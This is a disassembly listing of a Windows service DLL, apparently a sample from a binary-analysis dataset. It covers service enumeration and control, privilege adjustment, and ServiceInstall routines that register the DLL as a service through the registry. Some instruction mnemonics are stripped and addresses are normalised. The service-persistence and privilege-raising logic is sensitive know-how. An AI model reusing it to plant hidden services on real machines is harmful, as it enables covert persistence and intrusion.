lea ecx [ esp + 0x4 ]
mov [ esp + 0x58 ] 0xffffffff
call sub_10006470
mov ecx [ esp + 0x50 ]
xor eax eax
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x58
retn 0x4
sub_10006f10
sub esp 0x450
push ebx
push ebp
mov ebp ecx
push esi
push edi
xor edi edi
mov eax [ ebp ]
mov [ esp + 0x28 ] ebp
cmp eax edi
jne r-xdata
lea ecx [ esp + 0x18 ]
push edi
push ecx
lea edx [ esp + 0x1c ]
lea ecx [ esp + 0x18 ]
mov esi [ EnumServicesStatusExA@IAT ]
push edx
push ecx
push edi
push edi
push 0x3
push 0x30
push edi
push eax
mov [ esp + 0x38 ] edi
mov [ esp + 0x3c ] edi
mov [ esp + 0x40 ] edi
call esi
mov eax [ esp + 0x10 ]
cmp eax edi
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x450
retn
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ebx eax
cmp ebx edi
mov [ esp + 0x30 ] ebx
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x450
retn
lea edx [ esp + 0x18 ]
push edi
lea eax [ esp + 0x18 ]
push edx
mov edx [ esp + 0x18 ]
lea ecx [ esp + 0x18 ]
push eax
mov eax [ ebp ]
push ecx
push edx
push ebx
push 0x3
push 0x30
push edi
push eax
call esi
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x450
retn
push 0x104
call [ malloc@IAT ]
mov ebp eax
add esp 0x4
cmp ebp edi
mov [ esp + 0x2c ] ebp
jne r-xdata
push ebx
call [ LocalFree@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x450
retn
mov ecx 0x41
xor eax eax
mov edi ebp
lea edx [ esp + 0x3c ]
[ edi ]
mov ecx 0x40
lea edi [ esp + 0x3d ]
mov [ esp + 0x3c ] al
push ebp
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x40 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push 0x80
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push 0x1
push eax
and ecx 0x3
push 0x1
lea eax [ esp + 0x54 ]
push 0x40000000
push eax
[ edi ] [ esi ]
call sub_10002d60
mov esi eax
add esp 0x20
cmp esi 0xffffffff
mov [ esp + 0x24 ] esi
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x450
retn
mov eax [ esp + 0x14 ]
mov [ esp + 0x1c ] 0x0
test eax eax
jbe r-xdata
push ebp
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x450
retn
push ebx
call [ LocalFree@IAT ]
push esi
call [ CloseHandle@IAT ]
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x450
retn
lea ebp [ ebx + 0x4 ]
mov ebx [ esp + 0x20 ]
mov edi [ QueryServiceConfigA@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
push 0x0
push 0x0
push esi
call edi
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x14 ]
inc eax
add ebp 0x2c
cmp eax ecx
mov [ esp + 0x1c ] eax
jb r-xdata
mov edx [ ebx ]
lea ecx [ esp + 0x34 ]
push 0x0
push ecx
push eax
push edx
push edi
call esi
push ebx
call [ LocalFree@IAT ]
mov edi [ QueryServiceConfig2A@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
push 0x0
push 0x0
push 0x1
push esi
mov [ esp + 0x24 ] 0x0
call edi
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov ecx 0xc8
xor eax eax
lea edi [ esp + 0x140 ]
push 0x80000000
[ edi ]
mov esi [ ebp ]
or ecx 0xffffffff
mov edi esi
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x248 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ ebp - 0x4 ]
or ecx 0xffffffff
mov edi esi
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x144 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
mov [ esp + 0x454 ] ecx
mov edx [ ebp + 0x20 ]
mov [ esp + 0x450 ] edx
mov eax [ ebp + 0x4 ]
mov edx [ esp + 0x2c ]
mov [ esp + 0x458 ] eax
mov ecx [ ebp - 0x4 ]
mov eax [ edx ]
push ecx
push eax
call [ OpenServiceA@IAT ]
mov esi eax
test esi esi
mov [ esp + 0x38 ] esi
je r-xdata
mov esi [ esp + 0x24 ]
mov ebp [ esp + 0x2c ]
mov ebx [ esp + 0x30 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ebx eax
test ebx ebx
mov [ esp + 0x20 ] ebx
je r-xdata
mov eax [ esp + 0x10 ]
lea edx [ esp + 0x10 ]
push edx
push eax
push ebx
push esi
call edi
test eax eax
jne r-xdata
mov edi [ esp + 0x24 ]
mov esi [ WriteFile@IAT ]
lea ecx [ esp + 0x34 ]
push 0x0
push ecx
lea edx [ esp + 0x148 ]
push 0x320
push edx
push edi
call esi
mov eax [ esp + 0x45c ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
lea edx [ esp + 0x10 ]
push edx
push eax
push ebx
push 0x1
push esi
call edi
test eax eax
jne r-xdata
mov esi [ ebx + 0xc ]
or ecx 0xffffffff
mov edi esi
xor eax eax
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x348 ]
mov edx ecx
push ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x4 ]
mov [ esp + 0x45c ] eax
call [ LocalFree@IAT ]
mov esi [ esp + 0x38 ]
push ebx
call [ LocalFree@IAT ]
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x348 ]
[ edi ]
jmp r-xdata
mov edi [ ebx ]
test edi edi
je r-xdata
push ebx
call [ LocalFree@IAT ]
jmp r-xdata
push esi
mov [ esp + 0x460 ] 0x0
call [ CloseServiceHandle@IAT ]
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push esi
mov [ esp + 0x460 ] ecx
call [ CloseServiceHandle@IAT ]
jmp r-xdata
sub_100072f0
push ebx
mov ebx ecx
push ebp
mov ebp [ LockServiceDatabase@IAT ]
mov eax [ ebx ]
push esi
push edi
push eax
xor esi esi
call ebp
mov edi eax
test edi edi
jne r-xdata
mov edx [ esp + 0x14 ]
mov eax [ ebx ]
push 0x2
push edx
push eax
call [ OpenServiceA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x41f
jne r-xdata
mov ecx [ esp + 0x18 ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
push ecx
push 0xffffffff
push ebx
call [ ChangeServiceConfigA@IAT ]
mov esi eax
push edi
neg esi
sbb esi esi
neg esi
call [ UnlockServiceDatabase@IAT ]
push ebx
call [ CloseServiceHandle@IAT ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
push edi
call [ UnlockServiceDatabase@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x8
push 0x1388
call [ Sleep@IAT ]
mov ecx [ ebx ]
push ecx
call ebp
inc esi
mov edi eax
cmp esi 0x3
jge r-xdata
test edi edi
je r-xdata
test edi edi
jne r-xdata
jmp r-xdata
sub_100073a0
push ecx
push ebx
mov ebx ecx
push ebp
mov ebp [ LockServiceDatabase@IAT ]
mov eax [ ebx ]
push esi
push edi
push eax
xor edi edi
call ebp
mov esi eax
test esi esi
jne r-xdata
mov edx [ esp + 0x18 ]
mov eax [ ebx ]
push 0x2
push edx
push eax
call [ OpenServiceA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x41f
jne r-xdata
mov ecx [ esp + 0x1c ]
lea edx [ esp + 0x10 ]
push edx
push 0x1
push ebx
mov [ esp + 0x1c ] ecx
call [ ChangeServiceConfig2A@IAT ]
mov edi eax
push esi
neg edi
sbb edi edi
neg edi
call [ UnlockServiceDatabase@IAT ]
push ebx
call [ CloseServiceHandle@IAT ]
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x8
push esi
call [ UnlockServiceDatabase@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn 0x8
push 0x1388
call [ Sleep@IAT ]
mov ecx [ ebx ]
push ecx
call ebp
inc edi
mov esi eax
cmp edi 0x3
jge r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
jmp r-xdata
sub_10007450
sub esp 0x1c
push esi
mov esi [ esp + 0x28 ]
push edi
lea eax [ esi - 0x1 ]
cmp eax 0x3
ja r-xdata
mov eax 0x80
jmp [ eax * 4 + jump_table_100074c0 ]
lea edx [ esp + 0x8 ]
push edx
push esi
push edi
call [ ControlService@IAT ]
mov esi eax
push edi
neg esi
sbb esi esi
neg esi
call [ CloseServiceHandle@IAT ]
mov eax esi
pop edi
pop esi
add esp 0x1c
retn 0x8
pop edi
pop esi
add esp 0x1c
retn 0x8
mov eax 0x20
jmp r-xdata
mov eax 0x40
jmp r-xdata
mov ecx [ ecx ]
push eax
mov eax [ esp + 0x2c ]
push eax
push ecx
call [ OpenServiceA@IAT ]
mov edi eax
test edi edi
jne r-xdata
sub_100074d0
mov eax [ esp + 0x4 ]
mov ecx [ ecx ]
sub esp 0x1c
push ebx
push 0xf01ff
push eax
push ecx
call [ OpenServiceA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push 0x0
push ebx
call [ StartServiceA@IAT ]
test eax eax
jne r-xdata
pop ebx
add esp 0x1c
retn 0x4
lea edx [ esp + 0x4 ]
push edx
push ebx
call [ QueryServiceStatus@IAT ]
test eax eax
jne r-xdata
push ebx
call [ CloseServiceHandle@IAT ]
xor eax eax
pop ebx
add esp 0x1c
retn 0x4
push ebp
push esi
push edi
mov edi [ GetTickCount@IAT ]
call edi
mov ebp [ esp + 0x24 ]
mov esi eax
cmp [ esp + 0x14 ] 0x2
jne r-xdata
push ebx
call [ CloseServiceHandle@IAT ]
xor eax eax
pop ebx
add esp 0x1c
retn 0x4
mov edx [ esp + 0x14 ]
xor ecx ecx
cmp edx 0x4
push ebx
sete cl
mov esi ecx
call [ CloseServiceHandle@IAT ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x4
mov eax 0xcccccccd
mul [ esp + 0x28 ]
shr edx 0x3
cmp edx 0x3e8
jae r-xdata
cmp edx 0x2710
jbe r-xdata
mov edx 0x3e8
jmp r-xdata
push edx
call [ Sleep@IAT ]
lea eax [ esp + 0x10 ]
push eax
push ebx
call [ QueryServiceStatus@IAT ]
test eax eax
je r-xdata
mov edx 0x2710
cmp [ esp + 0x24 ] ebp
jbe r-xdata
call edi
mov ecx [ esp + 0x28 ]
sub eax esi
cmp eax ecx
ja r-xdata
call edi
mov ebp [ esp + 0x24 ]
mov esi eax
jmp r-xdata
cmp [ esp + 0x14 ] 0x2
je r-xdata
sub_100075d0
push ebx
mov ebx ecx
push ebp
mov ebp [ LockServiceDatabase@IAT ]
mov eax [ ebx ]
push esi
push edi
push eax
xor esi esi
call ebp
mov edi eax
test edi edi
jne r-xdata
mov edx [ esp + 0x14 ]
mov eax [ ebx ]
push 0x2
push edx
push eax
call [ OpenServiceA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x41f
jne r-xdata
mov ecx [ esp + 0x18 ]
push ecx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
push 0xffffffff
push 0xffffffff
push ebx
call [ ChangeServiceConfigA@IAT ]
mov esi eax
push edi
neg esi
sbb esi esi
neg esi
call [ UnlockServiceDatabase@IAT ]
push ebx
call [ CloseServiceHandle@IAT ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
push edi
call [ UnlockServiceDatabase@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x8
push 0x1388
call [ Sleep@IAT ]
mov ecx [ ebx ]
push ecx
call ebp
inc esi
mov edi eax
cmp esi 0x3
jge r-xdata
test edi edi
je r-xdata
test edi edi
jne r-xdata
jmp r-xdata
sub_10007680
mov eax [ esp + 0x4 ]
mov ecx [ ecx ]
push edi
push 0x10000
push eax
push ecx
call [ OpenServiceA@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
push edi
call [ DeleteService@IAT ]
mov esi eax
push edi
neg esi
sbb esi esi
neg esi
call [ CloseServiceHandle@IAT ]
mov eax esi
pop esi
pop edi
retn 0x4
pop edi
retn 0x4
sub_100076c0
push 0xffffffff
push sub_1006b1f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push esi
push edi
lea ecx [ esp + 0x8 ]
call sub_10006ee0
mov eax [ esp + 0x2c ]
mov [ esp + 0x20 ] 0x0
dec eax
cmp eax 0x6
ja r-xdata
mov [ esp + 0x10 ] r--data
jmp [ eax * 4 + jump_table_10007880 ]
lea ecx [ esp + 0x8 ]
call sub_10006f10
mov esi eax
test esi esi
jne r-xdata
mov eax [ esp + 0x30 ]
lea ecx [ esp + 0x8 ]
push eax
call sub_100074d0
jmp r-xdata
mov eax [ esp + 0x30 ]
lea ecx [ esp + 0x8 ]
push eax
call sub_10007680
jmp r-xdata
mov eax [ esp + 0x30 ]
mov ecx [ eax ]
add eax 0x4
push ecx
push eax
lea ecx [ esp + 0x10 ]
call sub_10007450
jmp r-xdata
mov edx [ esp + 0x30 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
lea eax [ ecx + edx + 0x1 ]
lea ecx [ esp + 0x8 ]
push eax
push edx
call sub_100075d0
test eax eax
jne r-xdata
mov eax [ esp + 0x30 ]
mov ecx [ eax ]
add eax 0x4
push ecx
push eax
lea ecx [ esp + 0x10 ]
call sub_100072f0
mov edx [ esp + 0x30 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
lea eax [ ecx + edx + 0x1 ]
lea ecx [ esp + 0x8 ]
push eax
push edx
call sub_100073a0
mov edx [ esp + 0x28 ]
lea ecx [ esp + 0xc ]
push ecx
push edx
mov [ esp + 0x14 ] 0x3
mov [ esp + 0x1c ] esi
call sub_10003930
push esi
call sub_10002a70
push esi
call [ free@IAT ]
add esp 0x10
jmp r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0x10 ] eax
jmp r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov [ esp + 0xc ] 0x1
jmp r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0x10 ] eax
jmp r-xdata
mov edx [ esp + 0x28 ]
lea ecx [ esp + 0xc ]
push ecx
mov [ esp + 0x10 ] 0x1
push edx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0x10 ] eax
jmp r-xdata
mov ecx [ esp + 0x28 ]
lea eax [ esp + 0xc ]
push eax
mov [ esp + 0x10 ] 0x1
push ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0x10 ] eax
jmp r-xdata
lea ecx [ esp + 0x8 ]
call sub_10006f00
mov ecx [ esp + 0x18 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn
mov [ esp + 0xc ] 0x0
mov eax [ esp + 0x28 ]
lea edx [ esp + 0xc ]
push edx
push eax
call sub_10003930
add esp 0x8
sub_100078a0
sub esp 0x20
lea eax [ esp ]
push eax
push 0x28
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x24 ]
lea ecx [ esp + 0x8 ]
push ecx
push edx
push 0x0
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
add esp 0x20
retn
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0xc ]
lea eax [ esp + 0x4 ]
mov [ esp + 0x14 ] ecx
push eax
push 0x0
lea ecx [ esp + 0x18 ]
mov [ esp + 0x20 ] edx
mov edx [ esp + 0x8 ]
push 0x10
push ecx
push 0x0
push edx
mov [ esp + 0x28 ] 0x1
mov [ esp + 0x34 ] 0x2
call [ AdjustTokenPrivileges@IAT ]
add esp 0x20
retn
mov eax [ esp ]
push eax
call [ CloseHandle@IAT ]
xor eax eax
add esp 0x20
retn
sub_10007930
mov eax 0x5004
call sub_1001d0d0
mov ecx [ esp + 0x500c ]
lea eax [ esp + 0x5010 ]
push edi
push eax
push ecx
lea edx [ esp + 0x10 ]
push 0x5000
push edx
call [ _vsnprintf@IAT ]
add esp 0x10
lea eax [ esp + 0x4 ]
lea edi [ esp + 0x8 ]
or ecx 0xffffffff
push 0x0
push eax
xor eax eax
mov edx [ esp + 0x5014 ]
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x14 ]
push ecx
push edx
call [ WriteFile@IAT ]
pop edi
add esp 0x5004
retn
ServiceMain
sub esp 0x100
lea ecx [ esp ]
push ebx
push esi
mov esi [ esp + 0x110 ]
push edi
mov edi [ strncpy@IAT ]
push 0x100
mov eax [ esi ]
push eax
push ecx
call edi
mov edx [ esi ]
mov ebx [ wcstombs@IAT ]
push 0x100
lea eax [ esp + 0x1c ]
push edx
push eax
call ebx
add esp 0x18
lea ecx [ esp + 0xc ]
push sub_10007b00
push ecx
call [ RegisterServiceCtrlHandlerA@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x100
retn 0x8
push ebp
push 0x1
push 0x0
push 0x2
call sub_10007aa0
push 0x0
push 0x0
push 0x4
call sub_10007aa0
mov ebp [ esp + 0x12c ]
add esp 0x18
cmp ebp 0x1
jle r-xdata
mov eax rw-data
mov edx [ esi + 0x4 ]
push 0x100
lea eax [ esp + 0x14 ]
push edx
push eax
call edi
mov ecx [ esi + 0x4 ]
push 0x100
lea edx [ esp + 0x20 ]
push ecx
push edx
call ebx
add esp 0x18
lea eax [ esp + 0x10 ]
jmp r-xdata
cmp eax 0x1
jne r-xdata
xor ecx ecx
cmp ebp 0x2
setg cl
push ecx
push eax
call sub_10007ba0
mov esi [ Sleep@IAT ]
add esp 0x8
pop ebp
push 0xa
call esi
mov eax [ rw-data ]
cmp eax 0x3
je r-xdata
sub_10007aa0
sub esp 0x1c
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x28 ]
mov [ rw-data ] eax
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x24 ]
lea edx [ esp ]
mov [ esp + 0xc ] eax
mov eax [ rw-data ]
push edx
push eax
mov [ esp + 0x8 ] 0x10
mov [ esp + 0x10 ] 0x7
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] 0xbb8
call [ SetServiceStatus@IAT ]
add esp 0x1c
retn
sub_10007b00
mov eax [ esp + 0x4 ]
dec eax
cmp eax 0x4
ja r-xdata
retn 0x4
jmp [ eax * 4 + jump_table_10007b88 ]
push 0x1
push 0x0
push 0x3
call sub_10007aa0
add esp 0xc
push 0xa
call [ Sleep@IAT ]
push 0x0
push 0x0
push 0x1
call sub_10007aa0
add esp 0xc
push 0x1
push 0x0
push 0x6
call sub_10007aa0
push 0x0
push 0x0
push 0x7
call sub_10007aa0
add esp 0x18
retn 0x4
push 0x1
push 0x0
push 0x5
call sub_10007aa0
push 0x0
push 0x0
push 0x4
call sub_10007aa0
add esp 0x18
retn 0x4
mov ecx [ rw-data ]
push 0x0
push 0x0
push ecx
call sub_10007aa0
add esp 0xc
retn 0x4
sub_10007bb0
push ecx
push ebx
push esi
push edi
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov esi eax
push esi
call [ LockServiceDatabase@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ esp + 0x14 ]
push 0x2
push eax
push esi
call [ OpenServiceA@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
pop ecx
retn
mov ecx [ rw-data ]
lea edx [ esp + 0xc ]
push edx
push 0x1
push edi
mov [ esp + 0x18 ] ecx
call [ ChangeServiceConfig2A@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
pop ecx
retn
push ebx
call [ UnlockServiceDatabase@IAT ]
push edi
mov edi [ CloseServiceHandle@IAT ]
call edi
push esi
call edi
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn
pop edi
pop esi
or eax 0xffffffff
pop ebx
pop ecx
retn
ServiceInstall
push ebp
mov ebp esp
push 0xffffffff
push sub_1006b210
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x23c
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
xor ebx ebx
mov edi rw-data
cmp eax ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] 0x80000002
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push ebx
push rw-data
push ecx
call [ RegOpenKeyExA@IAT ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x44 ]
lea ecx [ ebp - 0x248 ]
push eax
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x50 ]
push ecx
push edx
push ebx
push rw-data
push eax
mov [ ebp - 0x44 ] 0x1f4
call [ RegQueryValueExA@IAT ]
mov ecx [ ebp - 0x14 ]
mov esi eax
push ecx
mov [ ebp + 0x8 ] esi
call [ RegCloseKey@IAT ]
push esi
call [ SetLastError@IAT ]
cmp esi ebx
je r-xdata
lea edx [ ebp - 0x4c ]
push r--data
push edx
mov [ ebp - 0x4c ] rw-data
call _CxxThrowException
mov [ ebp - 0x18 ] eax
mov edi eax
mov ebx [ strchr@IAT ]
lea esi [ ebp - 0x248 ]
lea edx [ ebp - 0x34 ]
push r--data
push edx
mov [ ebp - 0x34 ] rw-data
call _CxxThrowException
lea eax [ ebp - 0x28 ]
push r--data
push eax
mov [ ebp - 0x28 ] rw-data
call _CxxThrowException
push edi
push esi
call [ _stricmp@IAT ]
add esp 0x8
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
push 0x0
push esi
call ebx
add esp 0x8
inc eax
mov esi eax
jmp r-xdata
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov ebx eax
test ebx ebx
mov [ ebp - 0x20 ] ebx
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
push 0x0
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
push 0x1
push 0x2
push 0x110
push 0xf01ff
push edx
push edi
push ebx
call [ CreateServiceA@IAT ]
test eax eax
mov [ ebp - 0x24 ] eax
jne r-xdata
lea ecx [ ebp - 0x3c ]
push r--data
push ecx
mov [ ebp - 0x3c ] rw-data
call _CxxThrowException
mov esi [ CloseServiceHandle@IAT ]
push eax
call esi
push ebx
call esi
push 0x1f4
lea ecx [ ebp - 0x248 ]
push rw-data
push ecx
mov [ ebp - 0x14 ] 0x80000002
call [ strncpy@IAT ]
push 0x64
lea edx [ ebp - 0x248 ]
push edi
push edx
call [ strncat@IAT ]
mov edx [ ebp - 0x14 ]
add esp 0x18
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x248 ]
push eax
push 0xf003f
push 0x0
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0x48 ]
push r--data
push eax
mov [ ebp - 0x48 ] rw-data
call _CxxThrowException
mov edx [ ebp - 0x14 ]
lea ecx [ ebp - 0x1c ]
push ecx
push rw-data
push edx
call [ RegCreateKeyA@IAT ]
mov edi eax
push edi
mov [ ebp + 0x8 ] edi
call [ SetLastError@IAT ]
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push r--data
push eax
mov [ ebp - 0x2c ] rw-data
call _CxxThrowException
mov edx [ rw-data ]
lea ecx [ ebp - 0x248 ]
push 0x1f4
push ecx
push edx
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x30 ]
push r--data
push eax
mov [ ebp - 0x30 ] rw-data
call _CxxThrowException
lea edi [ ebp - 0x248 ]
or ecx 0xffffffff
xor eax eax
mov edx [ ebp - 0x1c ]
[ edi ]
not ecx
push ecx
lea ecx [ ebp - 0x248 ]
push ecx
push 0x2
push eax
push rw-data
push edx
call [ RegSetValueExA@IAT ]
mov edi eax
push edi
mov [ ebp + 0x8 ] edi
call [ SetLastError@IAT ]
test edi edi
je r-xdata
lea eax [ ebp - 0x38 ]
push r--data
push eax
mov [ ebp - 0x38 ] rw-data
call _CxxThrowException
mov ecx [ ebp - 0x14 ]
push ecx
call [ RegCloseKey@IAT ]
mov edx [ ebp - 0x1c ]
push edx
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0x24 ]
push eax
call esi
push ebx
call esi
mov ecx [ ebp - 0x18 ]
push ecx
call sub_10007bb0
mov ecx [ ebp - 0xc ]
add esp 0x4
mov eax edi
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x40 ]
push r--data
push eax
mov [ ebp - 0x40 ] rw-data
call _CxxThrowException
UnServiceInstall
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov edi eax
mov [ ebp - 0x24 ] edi
test edi edi
jne r-xdata
mov eax rw-data
mov [ ebp - 0x28 ] eax
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x10000
push eax
push edi
call [ OpenServiceA@IAT ]
mov esi eax
mov [ ebp - 0x20 ] esi
test esi esi
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
push esi
call [ DeleteService@IAT ]
test eax eax
mov [ ebp - 0x4 ] 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ecx
mov [ ebp - 0x28 ] eax
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
push edi
call esi
sub_10008080
sub esp 0x9c
push ebx
push esi
mov esi [ esp + 0xa8 ]
push edi
push rw-data
push esi
call sub_10007930
mov ecx 0x27
xor eax eax
lea edi [ esp + 0x14 ]
add esp 0x8
[ edi ]
mov edi [ GetVersionExA@IAT ]
lea eax [ esp + 0xc ]
push eax
mov [ esp + 0x10 ] 0x9c
call edi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ esp + 0x1c ]
sub eax 0x2
jne r-xdata
lea ecx [ esp + 0xc ]
mov [ esp + 0xc ] 0x94
push ecx
call edi
test eax eax
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x9c
retn 0x4
mov eax [ esp + 0x10 ]
cmp eax 0x6
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x9c
retn 0x4
cmp eax 0x5
jne r-xdata
push rw-data
push esi
call sub_10007930
mov eax [ esp + 0x18 ]
add esp 0x8
cmp eax 0x4
ja r-xdata
cmp [ esp + 0x14 ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
push rw-data
push esi
call sub_10007930
mov eax [ esp + 0x18 ]
add esp 0x8
cmp [ esp + 0x14 ] 0x1
jne r-xdata
push rw-data
push esi
call sub_10007930
mov eax [ esp + 0x18 ]
add esp 0x8
cmp eax 0x5
jne r-xdata
mov cl [ esp + 0xa6 ]
cmp cl 0x1
jne r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
jne r-xdata
push rw-data
push esi
call sub_10007930
mov eax [ esp + 0x18 ]
add esp 0x8
cmp eax 0x5
jne r-xdata
cmp cl 0x3
jne r-xdata
cmp eax 0x4
jne r-xdata
push rw-data
push esi
call sub_10007930
mov eax [ esp + 0x18 ]
add esp 0x8
cmp eax 0x5
jne r-xdata
